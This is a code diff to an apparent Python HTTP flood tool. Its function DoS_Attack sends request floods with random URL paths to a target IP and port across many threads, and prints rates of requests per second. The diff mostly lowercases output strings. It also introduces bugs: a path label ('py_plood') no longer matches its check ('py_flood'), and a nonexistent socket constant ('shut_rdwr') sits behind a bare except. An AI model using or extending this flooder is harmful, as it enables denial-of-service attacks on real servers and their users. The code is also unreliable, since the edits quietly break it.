@@ -24,7 +24,7 @@ def clear_text():
         os.system('clear')
 
 def status_print(ip,port,thread_id,rps,path_get):
-    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
+    print(f"{Fore.YELLOW}HTTP{Fore.LIGHTYELLOW_EX}plood {Fore.WHITE}>{Fore.BLUE}target{Fore.WHITE}>{ip}:{port} {Fore.LIGHTBLUE_EX}path{Fore.WHITE}>{path_get} {Fore.CYAN}rps{Fore.WHITE}>{rps} {Fore.LIGHTCYAN_EX}id{Fore.WHITE}>{thread_id}{Fore.RESET}")
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, int(num)))
@@ -41,9 +41,9 @@ def generate_url_path_choice(num):
 def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
     rps = 0
     url_path = ''
-    path_get = ['PY_FLOOD','CHOICES_FLOOD']
+    path_get = ['py_plood','choices_flood']
     path_get_loader = random.choice((path_get))
-    if path_get_loader == "PY_FLOOD":
+    if path_get_loader == "py_flood":
         url_path = generate_url_path_pyflooder(5)
     else:
         url_path = generate_url_path_choice(5)
@@ -57,7 +57,7 @@ def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
             rps += 2
     except:
         try:
-            s.shutdown(socket.SHUT_RDWR)
+            s.shutdown(socket.shut_rdwr)
             s.close()
         except:
             pass
@@ -127,4 +127,4 @@ for loader_num in range(create_thread):
 clear_text()
 print(banner)
 status_code = True
-print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
+print(f"{Fore.GREEN}Trying sent . . .{Fore.RESET}")
